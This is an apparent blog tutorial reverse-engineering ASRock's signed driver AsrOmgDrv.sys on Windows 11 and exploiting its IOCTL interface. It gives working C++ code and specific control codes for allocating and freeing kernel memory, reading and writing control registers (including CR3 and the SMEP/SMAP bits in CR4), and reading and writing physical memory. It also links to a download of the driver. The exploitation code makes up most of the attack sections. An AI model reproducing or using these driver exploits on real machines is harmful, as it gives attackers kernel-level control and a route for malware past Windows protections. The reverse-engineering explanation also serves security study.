+++
title = 'Vulnerable Driver Reversal'
date = 2023-11-01T21:44:49+01:00
draft = true
+++



## Preliminary

Any driver that communicates with a user-mode application is potentially vulnerable. The privileges exposed by a driver through communication are not exclusively limited to a specific user-mode application (unless the driver takes an extra step to validate a specific process, which is rare), therefore they can be reverse engineered, exploited and leveraged by any program running in `ring3`. In the past, malware developers have exploited vulnerable drivers to manipulate `MSRs`, allocate `RWX` memory in the kernel virtual address space to execute shellcode, patch system calls, or even manually map an unsigned driver - this blog post demonstrates nothing new. However, Microsoft is often quick to revoke the signatures of drivers that they consider vulnerable, which may make it problematic to find a working vulnerable driver with a viable signature on the latest versions of windows.

In this blog post, we reverse engineer a working vulnerable driver (Windows 11 23H2) and communicate with it through `IOCTL` to exploit some of the many privileges it exposes: read/write control registers, manipulate `MSRS`, allocate/free contiguous physical memory, stall the processor, map physical memory, translate to physical address and more. This blog post makes it easy for a beginner reverse engineer to understand the internals of `IOCTL` operations & how to reverse communication structures effectively.

The driver we will be reversing in this post is `AsrOmgDrv.sys`, which was developed by `ASRock` incorporation. This is a Taiwanese company that manufacture motherboards - so it's no wonder they produce vulnerable drivers.

## Opening a handle to the driver

After loading the signed driver comfortably with `NtLoadDriver`, our first step is to open a handle to it. In short, a handle is an index that represents an entry on table maintained on a process, by process basis, that points logically to a kernel object residing in kernel space. They are, in essence, a way for `ring3` applications to indirectly reference kernel objects, and to communicate with this vulnerable driver we must open one. We can do this easily with `CreateFile`, but we need to find out some information about our vulnerable driver to call this function appropriately, such as it's device name. We can obtain everything we need to complete this call very easily with some basic static analysis, but first you should understand what the device name actually is.

To be able to communicate with a driver through `IOCTL`, the driver must have setup a device object which allows the OS to interact and communicate with the driver efficiently. According to the documentation, the device object structure represents a logical, virtual, or physical device for which a driver handles `I/O` requests (communication). This structure contains various fields of useful information that the `I/O` manager or driver could use when responding to a request made by another component within the system, such as the `ReferenceCount`, which represents the number of open handles to the device object and is mainly used by the `I/O` manager, the `IRP`, which we will look at later, and the `DriverObject`. Multiple device objects could exist within a system, so they need some unique identifier that can distinguish them from one another. This is where device names come into play, providing a distinctive label for each device object, allowing applications to accurately target and communicate with the desired device/driver. The device name is defined by the driver with a call to `IoCreateDevice`, so you could quickly gain a pointer to this function from the `.idata` section and `xref` to it. We will, however, be starting from the executable entry point.

So we begin our analysis at the executable entry point, which you can navigate to with `CRTL + E`. We see this routine set up the stack canary and `jmp` to the original entry point (`OEP`), where we will be obtaining all of our information required to call `CreateFile`.

```asm
public start
start proc near
sub     rsp, 28h
mov     r8, rdx
mov     r9, rcx
call    __security_init_cookie
mov     rdx, r8
mov     rcx, r9
add     rsp, 28h
jmp     DriverEntry
start endp
```

The psuedocode generated by IDA shown below shows the initialisation of a unicode string, followed by a subsequent call to `IoCreateDevice`. The purpose of this `DDI` is to "create a device object for use by a driver", and its 3rd argument is of type `UNICODE_STRING` - whose purpose is to represent the name of the device object, as we mentioned earlier.

```cpp
RtlInitUnicodeString(&DestinationString, aDeviceAsromgdr);
RtlInitUnicodeString(&v6, aDosdevicesAsro);
result = IoCreateDevice(DriverObject, 64i64, &DestinationString);
``` 
From this we can reasonably infer that the `.data` variable, "aDeviceAsromgdr" holds the name of our device, and its value is shown in disassembly the below.

```masm
lea     rdx, aDeviceAsromgdr ; "\\Device\\AsrOmgDrv"
lea     rcx, [rsp+68h+DestinationString] ; DestinationString
call    cs:RtlInitUnicodeString
```

Just like that, we have retrieved the device name and are now ready to open a handle to the driver with CreateFileA, with help from the documentation of course.

```cpp
unsigned __int32 open_handle_to_drv(HANDLE& DrvHandle) {
   DrvHandle = CreateFileA("\\\\.\\AsrOmgDrv", FILE_ANY_ACCESS, 
      0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
            
	return GetLastError();
}
```

## IOCTL Internals Summary

Now that we have successfully opened a handle, we could theoretically begin communicating with our driver. But first, we have to understand the basics of `IOCTL` operations & reverse all the communication structures that we need to talk to our driver meaningfully.

`IOCTLs` are commands used to communicate with device drivers and other kernel-mode software. `IOCTL` operations are managed by the `I/O` subsystem in Windows, which consists of several layers of software components, including file systems and device drivers that it uses to do its work.

There are multiple types of `IOCTL` commands, but within the scope of this blog we will only be focusing on `METHOD_BUFFERED`, which is conveniently the most common type of command. This type of `IOCTL` command is used for operations that transfer data between a driver and a user-mode application. The data is passed through a buffer, which can be allocated by the user-mode application or the driver, and can be any size.

Not all drivers are intended for communication, thus not all drivers inherently support `IOCTL` operations. You can tell if a driver supports `IOCTL` if it has created a device object, usually with `IoCreateDevice`, and has established a symbolic link, usually with `IoCreateSymbolicLink`, which is an indirect reference to the device. Evidently, our driver does both.

```masm
call    cs:IoCreateDevice
test    eax, eax
js      loc_160F2
lea     rdx, [rsp + 68h + DestinationString]
lea     rcx, [rsp + 68h + DeviceName]
call    cs:IoCreateSymbolicLink
```

Imagine a driver that provides multiple functionalities, like the one we're currently analysing. How does a user-mode application, when communicating with one of these drivers, specify which functionality they want to be executed? This is where control codes are introduced, and they are used by device drivers to handle different `IOCTL` operations. These control codes are integral values that specify the operation to be handled by the driver. It is important to note that these codes are driver defined, so we will have to continue reversing to find out what codes map to what operations.

User-mode applications use the `DeviceIoControl` `WINAPI` routine to communicate with device drivers. The routine requires that we specify a handle to the device we want to talk to, an application or driver-defined buffer where data will be written to and read from (remember `METHOD_BUFFERED`), a control code to specify the operation we want to be performed, and the size of these structures.

Now, it's time we understand what happens when a call to `DeviceIoControl` is made from user-mode at a high level. This will familiarise us with essential structures involved in reversing `IOCTL` communication.

* First, the user-mode input buffer passed to `DeviceIoControl` is validated with the routine `ProbeForRead`, which checks if the buffer is properly aligned

* Then, an `IRP` is created to represent the `I/O` request made from the `ring3` application to the `ring0` driver.

* A member of the `IRP` structure, `CurrentStackLocation` of type `IO_STACK_LOCATION`, is initialised to describe the parameters of the request.

* After all the relevant structures have been correctly setup, it's time for the driver to handle the request, so the `IRP` is passed to the `I/O` manager by calling `IoCallDriver`.

* At this point, control is handed over to the driver, and it handles the operation based on the control code in it's dispatch routine. We will continue to mention dispatch routines here briefly, but we will look at them more in depth later.

* The dispatch routine may access the `IO_STACK_LOCATION` pointed to by the `IRP` to complete its operation.

* When the dispatch routine is finished responding to the request, it sets the appropriate status information fields in the `IRP` to indicate the result of the operation.

* It then calls `IoCompleteRequest`, which signals to the `I/O` manager that it has finished its work.

* `DeviceIoControl` then copies the output buffer back to the user-mode application, and returns true or false to represent whether the operation completed successfully.

Let's discuss the dispatch routines we mentioned earlier when analysing the control flow of `DeviceIoControl`. Under the opaque `DRIVER_OBJECT` structure, there is a field displayed as "MajorFunction". This field is a pointer to an array of driver defined functions known as dispatch routines. These dispatch routines are created to handle a specific `I/O` operation. For example, when a user-mode application calls `ReadFile` and passes in a handle to a device object, the dispatch routine associated with the `ReadFile` operation will be executed. We should keep in mind, however, that a single dispatch routine may be used to handle multiple `I/O` operations, which you will see in the section following this one. Below you can see a list of operations that are handled by dispatch routines, we are interested in `DeviceControl`.

| Routine | Code | Operation |
|----------|----------|----------|
| CloseHandle | IRP_MJ_CLOSE | Close |
| CreateFile | IRP_MJ_CREATE | Create |
| **DeviceIoControl** | **IRP_MJ_DEVICE_CONTROL** | **DeviceControl** |
| ReadFile | IRP_MJ_READ | Read |
| WriteFile | IRP_MJ_WRITE | Write |

So now you should understand step 5 of `DeviceIoControl` better - the control flow was passed to the dispatch routine responsible for responding to `DeviceControl` requests. Now you have a fundamental understanding of `IOCTL`, we can start our journey on cracking the control codes & communication structures.

## Locating the DeviceControl dispatch routine

Getting a pointer to the `DeviceControl` dispatch routine is extremely easy. Given that the `IRP_MJ_DEVICE_CONTROL` constant is of value 0xE (meaning the `DeviceControl` dispatch routine is index 14 in the MajorFunction array), and that the start of the `MajorFunction` array is 0x70 bytes from the DriverObject, we can say that: **`offset_from_driver_object` - 0x70 = 0x70** because **0x70 / 8 = 0xE** . Therefore, **0x70 + 0x70 = `offset_from_driver_object` (0xE0)**. We divide 0x70 by 8 because each entry in the array is a pointer that occupies 8 bytes in memory.

Still within the `OEP`, we can easily distinguish the `DeviceControl` dispatch routine from other dispatch routines now that we know the offset - the function being written to **`DriverObject` + 0xE0**. The psuedocode below also depicts how a single dispatch routine can be used to handle multiple I/O operations, as described earlier.

```cpp
  if (NT_SUCCESS(IoCreateSymbolicLink(&devincename, &DestinationString)))
  {
     // same dispatch routine for two of the same I/O operations
     *(_QWORD *)(DriverObject + 0x70) = DispatchRoutine_1;
     *(_QWORD *)(DriverObject + 0x80) = DispatchRoutine_1;
      
     *(_QWORD *)(DriverObject + 0xE0) = ioctl_routine; // offset 0xE0
      
     // this is NOT a dispatch routine & is for unloading the driver
     // it is not important in this blog
     *(_QWORD *)(DriverObject + 0x68) = DriverUnload; 
```

## Making sense of the arguments passed to the IOCTL handler

```cpp
uint64_t __fastcall ioctl_routine(uint64_t a1, uint64_t a2)
```

So now it's finally time to end our analysis of the `OEP` and move into the dispatch routine that is invoked when we make a call to `DeviceIoControl`. We know that this is `IOCTLRoutine` from the code snippet above. The first step we should take is using logic to determine the meaning of the arguments passed to this routine. If we `xref` to this function, we'll find that it is only referenced when it is being written to the `MajorFunction` array, so we can only the reconstruct the real structures of these arguments from their use within the function, but before we do this, you should be introduced to the `SystemBuffer` field under the `IRP`.

### IRP->SystemBuffer

The `SystemBuffer` field under the `IRP` structure is used to hold the buffer for the current `I/O` operation during `METHOD_BUFFERED` `IOCTL` commands. This field is `0x18` bytes down the `IRP`, and if we look for references to `a2` (second argument) within the function, we can see that this offset is added to it. To assume that `a2` is of type `IRP` because `0x18` is added to it seems ludicrous at first, but we will do so because it's normal for the `IRP` to be passed to the `DeviceControl` dispatch routine (remember `DeviceIoControl` control flow analysis). This assumption is solidified when we look at other instances where `a2` is referenced, so we will re-name this 'Irp'. Now, we can decipher other structures using our hypothesis that `a2` is the Irp.

```cpp
  IoStackLocation = *(unsigned long long *)(Irp + 0xB8);
  SystemBuffer = *(int **)(Irp + 0x18);
  *(unsigned long *)(Irp + 48) = 0;
  *(unsigned long long *)(Irp + 56) = 0i64;
  v4 = *(unsigned long long *)(a1 + 0x40);
  ControlCode = *(unsigned long *)(IoStackLocation + 0x18);
  
  if ( *(unsigned char *)IoStackLocation != 14 )
    goto LABEL_132;
```

Below is the psuedocode cleaned up, so you can understand more clearly.

```cpp
#define IRP_MJ_DEVICE_CONTROL 0xE

IoStackLocation = Irp->CurrentStackLocation;
SystemBuffer = Irp->SystemBuffer;
Irp->IoStatus->Status = NULL;
Irp->IoStatus->Information = NULL;

v4 = *(QWORD*)(a1 + 0x40); // Yet to be determined
ControlCode = IoStackLocation->IoControlCode;

/* Here we check if the I/O operation is for DeviceControl, 
if it isn't we jmp to a location we will analyse later */

if (IoStackLocation->MajorFunction != IRP_MJ_DEVICE_CONTROL) goto LABEL_132;
```

Now we have all the information to begin constructing our communication buffers, so we will ignore `a1`. From experience, this is usually the `DEVICE_OBJECT` structure. This is where things get interesting - we will now start looking at the first vulnerability exposed by this driver.

## Allocate contiguous physical memory

```cpp

if ( *(_BYTE *)IoStackLocation != 14 )
    goto LABEL_132;
  ControlCode = *(_DWORD *)(IoStackLocation + 0x18);
  if ( ControlCode > 0x222858 )
  {
    if ( ControlCode > 0x22287C )
    {
      switch ( ControlCode )
      {
        case 0x222880u:
          StatusCode = sub_11F48((_UNICODE_STRING *)SystemBuffer);
          *(_DWORD *)(Irp + 0x30) = StatusCode;
          if ( StatusCode < 0 )
```

This code snippet teaches us more about how control codes are used to allow a user-mode application to specify what operations they want to get executed. If I wanted `sub_11F48` to be called, I would pass in the control code `0x222880u` to `DeviceIoControl`. Below you can see the logic of `sub_11F48` in the psuedocode, keep in mind the argument passed to it - which is the buffer that data gets written to/read from. This is the first communication structure we will recreate.

```cpp
NTSTATUS __fastcall sub_11F48(unsigned int *CommunicationBuffer)
{
  __int64 ContiguousMemorySpecifyCache; // rax

  *((QWORD *)CommunicationBuffer + 1) = 0i64;
  ContiguousMemorySpecifyCache = MmAllocateContiguousMemorySpecifyCache(
                                   *CommunicationBuffer,
                                   0x100000,
                                   4026531840,
                                   0x10000,
                                   0);
                                   
  *((QWORD *)CommunicationBuffer + 1) = ContiguousMemorySpecifyCache;
  if ( not ContiguousMemorySpecifyCache ) return STATUS_UNSUCCESSFUL;
    
  CommunicationBuffer[1] = MmGetPhysicalAddress(ContiguousMemorySpecifyCache);
  return 0i64;
}
```

The first important thing we should take notice of in this psuedocode is the write to `CommunicationBuffer + 1`. In C, we know that an array will decay to a pointer to the first element in a range of contiguous elements, so  `*((QWORD *)CommunicationBuffer + 1)` must be identical to `CommunicationBuffer[1]`. So straight away, we know when this dispatch routine handler is invoked, it takes the input buffer and makes a write 8 bytes down with the value 0. The use and type of the previous 8 bytes below the starting address of the write are currently unknown. They could be two 32-bit integers, one 64-bit integer, 8 8-bit integers etc; right now we just know that 8 bytes down the start of the buffer is a 64-bit integer, because of the 0i64 written into it. Now you may have falsely made the assumption that because 8 bytes down the buffer is a 64-bit integer, the first subobject in this contiguous buffer is guaranteed to be a 64-bit integer, because arrays always consists of subojects of the same type. However, it is not mandatory that the buffer in `METHOD_BUFFERED` `IOCTL` operations must be an array. They can be structures or trivial classes in which the space occupied by each suboject in the buffer differs, essentially a heterogeneous array - this is actually quite common. So, when deducing the type of an element in the buffer/communication structure, it should not be generalised based on the type of one of its members in the contiguous array, but how it is used within the dispatch routine (or the routine called by the dispatch routine that maps to the control code specified). In this case, the subojects are of the same type, so the buffer can be constructed as a normal array. I came to this conclusion by looking at the use of the first subobject, and we see it's the first argument in `MmAllocateContiguousMemorySpecifyCache`. The documentation for this routine states that this argument should be of type `int64`, which is the same type as the second subobject in the buffer. Furthermore, the purpose of this argument is to represent the amount of bytes that should be allocated with `MmAllocateContiguousMemorySpecifyCache`, so the first subobject in our buffer should be representative of this. The use of the second argument is better understood if the buffer were manipulated structurally, so I've casted the buffer to a `UNICODE_STRING`, which you can see below, along with the layout of `UNICODE_STRING`

```cpp
struct _UNICODE_STRING
{
    USHORT Length;                                                          //0x0
    USHORT MaximumLength;                                                   //0x2
    WCHAR* Buffer;                                                          //0x8
}; 

NTSTATUS __fastcall sub_11F48(_UNICODE_STRING *CommunicationBuffer)
{
  WCHAR *ContiguousMemorySpecifyCache; // rax

  CommunicationBuffer->Buffer = 0i64;
  ContiguousMemorySpecifyCache = (WCHAR *)MmAllocateContiguousMemorySpecifyCache(
                                            *(unsigned int *)&CommunicationBuffer->Length,
                                            0x100000i64,
                                            4026531840i64,
                                            0x10000i64,
                                            0);
  CommunicationBuffer->Buffer = ContiguousMemorySpecifyCache;
  if ( !ContiguousMemorySpecifyCache ) return STATUS_UNSUCCESSFUL;
  
  *(_DWORD *)(&CommunicationBuffer->MaximumLength + 1) = 
  				MmGetPhysicalAddress(ContiguousMemorySpecifyCache);
  return 0;
 }
 ```

 We initially see nothing unusual, there is a write to 8 bytes down (`UNICODE_STRING->Buffer`) the beginning of the buffer with the return value of `MmAllocateContiguousMemorySpecifyCache`, which is the start of the system virtual memory that we allocated - this is what we expected. However, we later then see `*(DWORD *)(&CommunicationBuffer->MaximumLength + 1)` - which is `*((QWORD *)CommunicationBuffer + (1/2))` - being written to with the physical address, meaning the last 32 bits of the first subobject within the buffer gets overwritten from the amount of memory we want to allocate to the 32 bits from the physical address returned by `MmGetPhysicalAddress`. This is interesting, because it indicates to us that our communication structure should be not be an array of 2 int64s, but 2 int32s and 1 int64. The first subobject of type int32 in our buffer should specify the size, as usual. The second subobject of type int32 should represent 32 bits from the physical address that maps to the kernel memory we allocated, and the third (int64) should remain the same (return value of `MmAllocateContiguousMemorySpecifyCache`). This way, no bytes are overwritten. However, the price to pay for this structural change is that the maximum amount of memory that could be possibly allocated has been truncated to `(2 ^ 32)`, from `(2 ^ 64)`, which is fortunately still a lot of memory. So now, we have two possible options for our communication structure that will server as the `InputBuffer` to `DeviceIoControl`. If you somehow haven't noticed already, size is the only member/suboject we have to specify, and our driver returns to us the physical address and start of the kernel virtual range.

 ```c++
 // case 1 (no bytes are overwritten but maximum memory that can be allocated is truncated):

#pragma pack(push, 1)
typedef struct _ALLOCATE_CONTIGUOUS_MEMORY
{
	unsigned long Size;
	unsigned long PhysicalAddress_32bits;
	unsigned long long KernelVirtualMemoryBuffer;
}ALLOCATE_CONTIGUOUS_MEMORY, * PALLOCATE_CONTIGUOUS_MEMORY;
#pragma pack(pop)


// case 2 (bytes get overwritten but more memory can be allocated):

DWORDLONG InputArg[2];

// case 2 represented as a structure:

#pragma pack(push, 1)
typedef struct _ALLOCATE_CONTIGUOUS_MEMORY
{
	unsigned long long Size_And_Physical;
	unsigned long long KernelVirtualMemoryBuffer;
}ALLOCATE_CONTIGUOUS_MEMORY, * PALLOCATE_CONTIGUOUS_MEMORY;
#pragma pack(pop)
```

Now we have all the information we need to talk to our vulnerable driver and force it to allocate kernel space virtual memory that is contiguous in physical memory. We have our handle to the device object, we have the communcation structures properly set up and we have the correct control code. Below shows a code snippet using the second communication structure discussed above.

```cpp
typedef struct _OUTPUT_INFORMATION
{
	unsigned long PhysicalAddress_32bits;
	unsigned long long KernelVirtualMemoryBuffer;
} OUTPUT_INFORMATION, * POUTPUT_INFORMATION;

bool allocate_kernel_memory(unsigned __int64 size, OUTPUT_INFORMATION& info)
{
	// array of 64-bit integers
	std::remove_reference< decltype( size ) >::type input_buffer[2];

	// set the first suboject in the array to the amount of memory we want to allocate
	*input_buffer = size;
    
	// send a message to the driver to allocate kernel memory using the ctl code
	unsigned long bytes_returned = 0;
	if (not DeviceIoControl(drv_handle, 0x222880, &input_buffer, sizeof(input_buffer),
		&input_buffer, sizeof(input_buffer), &bytes_returned, nullptr)) return false;

	info.KernelVirtualMemoryBuffer = input_buffer[1];
	info.PhysicalAddress_32bits = (*input_buffer) & 0xFFFFFFFF;

	return true;
}
```

The virtual memory manager does not ensure memory allocated in system space will not exceed the lifetime of the component that allocated it. This means using a vulnerable driver to allocate memory puts us at risk of a memory leak, when we unload the driver without freeing any memory, all our allocations are still active. Luckily, this driver exposes `MmFreeContiguousMemorySpecifyCache as well`. Before we move on, we should note that the protection of this allocated memory is not necessarily `RWX`. With virtualisation based security (`VBS`) & memory integrity (`HVCI`) enabled, `EPTEs` trump the normal description placed on virtual memory by `PTEs`, ensuring that no kernel page, except special kernel pages, can be `RWX`. This blog isn't at all about these topics, so we should move on, just note that these security mechanisms are enabled on default windows 11.

## Free Contiguous Memory

```cpp
  case 0x222884u:
    MmFreeContiguousMemorySpecifyCache(*(uint64_t*)(SystemBuffer + 8), 
            *(unsigned int *)SystemBuffer, 0i64);
    goto LABEL_132;
```

Using the tactics described in the previous section, we can construct our communication buffer and send a request to the vulnerable driver with the appropriate control code `0x222884`. The driver allows us to specify the range (size) we want to free, which will be the second subobject in the buffer, and of course the starting address of the buffer that is to be freed, which will be the first. Like last time, we can pass a normal array or a structure, but the maximum number of subobjects is 2. The structure would consist of an int32 and an `int64` in that order, and the array would have to be of type `int64`. I will show the code example below using a structure this time, so we know how to communicate in both ways.

```cpp
#pragma pack(push, 1)
typedef struct _FREE_CONTIGUOUS_MEMORY
{
	unsigned long long StartingVA;
	unsigned long Size;
} FREE_CONTIGUOUS_MEMORY, * PFREE_CONTIGUOUS_MEMORY;
#pragma pack(pop)

void free_kernel_memory(unsigned __int32 size, unsigned __int64 starting_va)
{
	// set up the structure
	FREE_CONTIGUOUS_MEMORY buffer{};
	buffer.StartingVA = starting_va;
	buffer.Size = size;

	// tell our vuln driver to free memory
	DWORD bytes_returned{};
	DeviceIoControl(drv_handle, 0x222884, &buffer, 
    		sizeof(buffer), &buffer, sizeof(buffer), &bytes_returned, nullptr);
}
```

Now you have a basic understanding of reversing the dispatch routine to recreate communication structures, we'll advanced to our next vulnerability: read & write control registers.

## Read/Write Control Registers

```cpp
  if ( !v79 )
    if ( *(_DWORD *)SystemBuffer ) {
            switch ( *(_DWORD *)SystemBuffer )
            {
              case 2:
                CurrentIrql = __readcr2();
                break;
              case 3:
                CurrentIrql = __readcr3();
                break;
              case 4:
                CurrentIrql = __readcr4();
                break;
              case 8:
                CurrentIrql = KeGetCurrentIrql();
                break;
              default:
                *(_QWORD *)(Irp + 0x38) = 0i64;
                *(_DWORD *)(Irp + 0x30) = 0xC0000001;
                goto LABEL_132;
            }
    }
    else
    {
            CurrentIrql = __readcr0();
    }
```

From this snippet, we can see that the first subobject within the communication buffer should represent the control register we want to read from. We aren't allowed to read every control register that there is, and in the case we pass an option that is not present, our driver returns to us the `STATUS_UNSUCCESSFUL` `NTSTATUS` error code. We are also allowed to obtain the current `IRQL`, which is just a read from `cr8`. The read `cr3` privilege exposed would work well with the map physical & read/write vulnerability that we will inspect later, but unfortunately there are some security mitigations involving `MmMapIoSpace` that prevent us from mapping page tables, but you could try on older versions of windows. The only ambiguity associated with this vulnerability is its control code, due to the way the psuedocode is presented to us. Luckily, deciphering it is just a matter of adding numbers. We can see that the condition for this vulnerability to be executed is satisfied when `v79` is 0. I've highlighted all the lines associated with `v79`, whether explicitly or not, until we have a hardcoded value. Using this techqniue, we know that `ControlCode - 2238556 - 16 = 0`, and so we make ControlCode the subject of the equation to get its value. We subtract 16 because it is the product of 4*4, since 4 was subtracted from the original control code 4 times. Now we know that our control code is `2238572` or `0x22286C` for reading control registers, we can send a request to our driver.

```cpp
unsigned __int64 read_cr(uint64_t control_reg)
{
	uint64_t InputBuffer[2];
	*InputBuffer = ControlRegister;

	DWORD bytes_returned;
	DeviceIoControl(drv_handle, 2238572, &InputBuffer, 
        sizeof(InputBuffer), &InputBuffer, sizeof(InputBuffer),
     &bytes_returned, nullptr);

	return InputBuffer[1];
}
```

At this point, you can see how easy it is to exploit vulnerable drivers. For the following vulnerabilities that are exploited similarly to the ones described in the previous section, I'll just be showing the disassembly or psuedocode with a basic description, along with the communication structures and a function demonstrating communication.

Being able to write to control registers is a very powerful vulnerability. For example, when we load `CR3` with a different physical address, we establish a whole new & different `VA -> PA` translation - we  are, in essence, in a new virtual address space. We can also see that we can change the `IRQL` (`writecr8`), though user-mode code is always executed at passive level, and so are most dispatch routines. We should not forget about `CR4`, with which we can toggle `SMEP/SMAP` (not reliable on newer versions of windows). With great power comes great responsibility, so this set of vulnerabilities should be used under extreme caution, for your own device's safety. The structure for this communication buffer is identical to the first one, but this time there is no data returned to us from the driver, and we have to populate each & every subobject with a value. The first being the control register we want to write to, and the second, the value to be written. For the sake of brevity, we will continue to use an array as our communication buffer.

```cpp
bool write_cr(uint64_t ControlRegister, DWORDLONG NewValue)
{
	uint64_t InputArg[2];
	*InputArg = ControlRegister;
	InputArg[1] = NewValue;

	DWORD bytes_returned;
	return DeviceIoControl(drv_handle, 2238576, &InputArg, 
    	sizeof(InputArg), &InputArg, sizeof(InputArg),
         &bytes_returned, nullptr);
}
```

You should get the hang of it now, so I'll leave the vulnerable driver at the end so you can reverse every vulnerability yourself since this process is becoming more repetitive than informative. But before I do that, we'll go over one last vulnerability.

## Read/Write Physical Memory

```cpp
mapped_buffer_1 = MmMapIoSpace(SystemBuffer->PhysicalAddress, SystemBuffer->Flags, 0i64);
  if ( mapped_buffer_1 )
  {
    return_buffer = (WCHAR *)SystemBuffer->Name;
    number_of_bytes = SystemBuffer->Flags;
    mapped_buffer = (int *)mapped_buffer_1;
    while ( number_of_bytes )
    {
      DataType = *(&SystemBuffer->Flags + 1);
      if ( DataType )
      {
        v35 = DataType - 1;
        if ( v35 )
        {
          if ( v35 == 1 )
          {
            value = *mapped_buffer++;
            *(_DWORD *)return_buffer = value;
            return_buffer += 2;
            number_of_bytes -= 4;
          }
        }
        else
        {
          word_value = *(_WORD *)mapped_buffer;
          mapped_buffer = (int *)((char *)mapped_buffer + 2);
          *return_buffer++ = word_value;
          number_of_bytes -= 2;
        }
      }
      else
      {
        byte_value = *(unsigned __int8 *)mapped_buffer;
        mapped_buffer = (int *)((char *)mapped_buffer + 1);
        *(_BYTE *)return_buffer = byte_value;
        return_buffer = (WCHAR *)((char *)return_buffer + 1);
        --number_of_bytes;
      }
    }
    MmUnmapIoSpace(mapped_buffer_1, SystemBuffer->Flags);
    v30 = 0;
  }
```

Let's analyse the psuedocode above line by line and try to make sense of what's going on. I have casted the communication buffer `(SystemBuffer)` to a structure type of `RTL_QUERY_REGISTRY_TABLE` and renamed the fields, which will help us understand the alignment of the different fields within the communication buffer we will be constructing. I will be referring to the `RTL_QUERY_REGISTRY_TABLE` structure as 'RtlQ' from now on. The layout of this structure is shown below. 

```cpp
struct _RTL_QUERY_REGISTRY_TABLE
{
    LONG (*QueryRoutine)(WCHAR* arg1, ULONG arg2, VOID* 
        arg3, ULONG arg4, VOID* arg5, VOID* arg6);  //0x0
    ULONG Flags;                                    //0x8
    WCHAR* Name;                                    //0x10
    VOID* EntryContext;                             //0x18
    ULONG DefaultType;                              //0x20
    VOID* DefaultData;                              //0x28
    ULONG DefaultLength;                            //0x30
};
```

On the first line we see a call to `MmMapIoSpace`, which maps a physical address range in the virtual `system PTE` range. It uses a physical address provided by our communication buffer, which should be the first suboject, and the amount of bytes from the physical range that should be mapped, which should be the next subobject. `SystemBuffer->PhysicalAddress` has the same offset from the beginning of `SystemBuffer` as `RtlQ->QueryRoutine` does from `RtlQ` (an offset of 0), and they are both the size of an `int64`. This means that the next subobject, which we've already identified as the number of bytes to be mapped, should start at `(SystemBuffer + 0x8)`, making `SystemBuffer->NumberOfBytes` have the same offset as `RtlQ->Flags` from the beginning of the structure. After the call to `MmMapIoSpace` is made, it's return value is checked, and if the function fails the `StatusCode` of the `IOCTL `operation is set to `0xC0000001 (STATUS_UNSUCCESSFUL)`. In the case that the call did succeed, we begin iterating under the condition that the number of bytes is greater than zero. Now, another subobject within our communication buffer is introduced, which I've named `DataType` for now. In the case that this value is 0, we `jmp` to the block of code down below.

```cpp
       	byte_value = *(unsigned __int8 *)mapped_buffer;
        mapped_buffer = (int *)((char *)mapped_buffer + 1);
        *(_BYTE *)return_buffer = byte_value;
        return_buffer = (WCHAR *)((char *)return_buffer + 1);
        --number_of_bytes;
```

From this psuedocode, it is clear that this is a read operation. First, the value at the start of the mapped buffer is stored into a variable named `byte_value`, and then `mapped_buffer` is incremented to point to the byte that is after the previous byte that was read. Then, `byte_value` is copied into `return_buffer`, who's initial value was:

```cpp
    return_buffer = (wchar_t *)SystemBuffer->ReturnBuffer;
```

After the copy, we increment the return_buffer to point to the byte after where the new data was copied. Then, the `NumberOfBytes` is decremented to indicate that we have copied one byte. When all the bytes are copied, `NumberOfBytes` will equal zero, and the loop will break. So, essentially, we map a physical range to a `system PTE` virtual range and then copy the contents of that range, byte by byte, into a user-mode buffer. Now we see that the other two options specified by the value of `DataType` only differ in the way they copy each section of memory. If `DataType` is 2, then data will be copied as `DWORD` (4 bytes) chunks, and if `DataType` is 1, it'll be copied as `WORDS` (2 bytes). Knowing this, we can reconstruct the psuedocode to make it easily understandable

```cpp
#define SIZEOF_DWORD 4
#define SIZEOF_WORD 2
#define SIZEOF_BYTE 1

int* mapped_buffer = (int*)MmMapIoSpace(SystemBuffer->PhysicalAddress, 
		SystemBuffer->NumberOfBytes, 0i64); 
        
if ( !mapped_buffer ) 
{ 
    StatusCode = STATUS_UNSUCCESSFUL; 
    Irp->IoStatus->Status = StatusCode;
    Irp->IoStatus->Information = 24;
    IofCompleteRequest(Irp, 0);
}
else 
{
    return_buffer = (WCHAR *)SystemBuffer->ReturnBuffer;
    number_of_bytes = SystemBuffer->NumberOfBytes;

    while (NumberOfBytes) 
    {
        DataType = *(&SystemBuffer->NumberOfBytes + SIZEOF_BYTE);
      
        if ( DataType == 2 )
        {
      	    // Copy DWORD by DWORD
            dword_value = *mapped_buffer++;
            *(_DWORD *)return_buffer = dword_value;
            return_buffer += SIZEOF_WORD;
            number_of_bytes -= SIZEOF_DWORD;
        }
        else if ( DataType == 1 )
        {
      	    // Copy WORD by WORD
            word_value = *(_WORD *)mapped_buffer;
            mapped_buffer = (int *)((char *)mapped_buffer + SIZE_WORD);
            *return_buffer++ = word_value;
            number_of_bytes -= SIZEOF_WORD;
        } 
        else if ( DataType == 0 )
        {
      	    // Copy BYTE by BYTE
      	    byte_value = *(unsigned __int8 *)mapped_buffer;
            mapped_buffer = (int *)((char *)mapped_buffer + SIZEOF_BYTE);
            *(_BYTE *)return_buffer = byte_value;
            return_buffer = (WCHAR *)((char *)return_buffer + SIZEOF_BYTE);
            --number_of_bytes;
        }
     }
}
```

So our communication buffer should look something like this.

```cpp
#pragma pack(push, 1)
typedef struct _READ_PHYSICAL
{
	uint64_t PhysicalAddress; // 0x0 (Input)
	uint32_t NumberOfBytes;   // 0x8 (Input)
	uint32_t DataType;        // 0xC (Input)
	void*    ReturnBuffer;    // 0x10 (Output)
} READ_PHYSICAL, *PREAD_PHYSICAL;
#pragma pack(pop)
```

The control code for this operation is `0x222808`, so you now have all the information needed to read physical memory with this driver. The "write physical" operation  is almost identical to the read operation, and so in depth explanation again is not needed. The only difference is that the purpose of the last field in the communication buffer should not be a user-mode allocated buffer that the mapped virtual memory will be copied to, but a value that the mapped virtual memory will be written to, the control code that maps to this operation is `0x22280C`.

## Conclusion

Now you should be able to reverse drivers for their device name, communication structures, control codes and understand the logic of the different operations. You should also understand how `IOCTL` works internally, at a high level. We've looked at `R/W` control registers, allocate and release kernel memory and `R/W` physical memory. There are still a lot of different vulnerabilities that this driver exposes, so you can download it and continue reversing it for yourself here https://github.com/xgtbz/AsrOmgDrv.


